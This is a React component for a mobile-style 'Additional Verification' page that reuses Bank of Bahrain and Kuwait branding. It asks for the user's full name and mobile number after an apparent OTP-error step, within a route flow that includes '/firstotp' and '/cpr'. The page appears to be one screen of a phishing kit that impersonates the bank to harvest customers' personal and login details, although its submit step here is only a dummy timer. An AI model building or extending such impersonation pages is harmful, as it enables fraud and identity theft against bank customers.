// PersonalInfo.jsx
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function Realname() {
  const navigate = useNavigate();

  const [fullName, setFullName] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [loading, setLoading] = useState(false);

  // Check if user came from OTP page
  useEffect(() => {
    const fromOtpError = sessionStorage.getItem("from_otp_error");
    if (!fromOtpError) {
      navigate("/firstotp"); // redirect back to OTP page if not
    }
  }, [navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!fullName.trim() || !mobileNumber.trim()) {
      alert("Please fill in all required fields");
      return;
    }

    if (mobileNumber.replace(/\s/g, "").length < 8) {
      alert("Please enter a valid mobile number");
      return;
    }

    setLoading(true);

    // Dummy API call simulation
    setTimeout(() => {
      setLoading(false);
      // Store info in session/local storage or navigate to next step
      navigate("/nextstep"); // replace with your next page
    }, 1500);
  };

  // Format mobile number
  const handleMobileInput = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 0) {
      if (value.length <= 8) {
        value = value.replace(/(\d{4})(\d{0,4})/, "$1 $2").trim();
      } else {
        value = "+" + value;
      }
    }
    setMobileNumber(value);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] flex flex-col items-center px-6 py-12 text-white">
      
      {/* Logo */}
      <div className="w-full flex justify-end mb-16">
        <div className="flex flex-col items-center text-center">
          <div className="relative text-3xl font-bold tracking-wide mb-1">
            BBK
            <span className="absolute -top-1 -right-4 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-10">
        <h1 className="text-2xl font-light mb-2">Additional Verification</h1>
        <p className="text-sm opacity-80">
          For your security, please provide the following information to complete the verification process
        </p>
      </div>

      {/* Form */}
      <form
        onSubmit={handleSubmit}
        className="flex flex-col w-full max-w-md"
      >
        <div className="mb-8">
          <input
            type="text"
            placeholder="Full Name *"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
            required
          />
        </div>

        <div className="mb-8">
          <input
            type="text"
            placeholder="Mobile Number *"
            value={mobileNumber}
            onChange={handleMobileInput}
            className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
            required
          />
        </div>

        <button
          type="submit"
          className={`w-full py-4 rounded-full text-lg font-medium transition ${
            loading
              ? "bg-white/30 cursor-not-allowed"
              : "bg-white/20 hover:bg-white/30"
          }`}
          disabled={loading}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <span className="w-5 h-5 border-2 border-t-white border-white/30 rounded-full animate-spin mr-2"></span>
              Processing...
            </div>
          ) : (
            "Continue"
          )}
        </button>

        <div className="text-center mt-6">
          <button
            type="button"
            onClick={() => navigate("/cpr")}
            className="text-sm text-white/90 hover:text-white underline"
          >
            ← Back
          </button>
        </div>
      </form>
    </div>
  );
}
